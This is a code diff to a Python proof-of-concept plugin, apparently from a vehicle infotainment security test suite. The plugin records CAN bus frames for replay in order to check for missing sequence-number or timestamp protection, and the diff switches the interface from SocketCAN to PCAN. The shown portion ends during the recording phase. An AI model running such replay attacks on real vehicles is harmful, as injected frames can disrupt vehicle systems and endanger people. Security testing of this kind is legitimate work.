@@ -1,13 +1,13 @@
 """
 PoC Name: CAN Replay Attack
 CVE: N/A
-Component: Canbus Stack
-Category: Canbus
+Component: CAN Bus (PCAN)
+Category: Protocol
 Severity: High
 CVSS: 7.0
-Description: 录制并重放CAN帧,验证是否缺少序列号保护
-Prerequisites: SocketCAN接口, python-can库。
-Usage: python3 25_CAN_Replay_Attack.py <can_interface>
+Description: 录制CAN总线消息并重放,验证是否缺少序列号/时间戳保护。
+Prerequisites: PCAN接口, python-can库, PCAN驱动。
+Usage: python3 25_CAN_Replay_Attack.py PCAN_USBBUS1
 """
 import sys
 import time
@@ -15,14 +15,19 @@ from iv_plugin_base import IVIVulnerabilityPlugin
 
 class CANReplayPlugin(IVIVulnerabilityPlugin):
     def check_prerequisites(self):
+        iface = self.params.get("can_interface", "PCAN_USBBUS1")
+        self.logger.info(f"检查CAN接口: {iface}")
         return True
 
     def exploit(self):
-        iface = self.params.get("can_interface", "can0")
+        iface = self.params.get("can_interface", "PCAN_USBBUS1")
         self.logger.info(f"CAN重放攻击测试 ({iface})...")
         try:
             import can
-            bus = can.interface.Bus(channel=iface, bustype="socketcan")
+            if "PCAN" in iface:
+                bus = can.interface.Bus(channel=iface, interface="pcan", bitrate=500000)
+            else:
+                bus = can.interface.Bus(channel=iface, bustype="socketcan")
             # Phase 1: Record
             self.logger.info("Phase 1: 录制CAN帧 (3秒)...")
             recorded = []
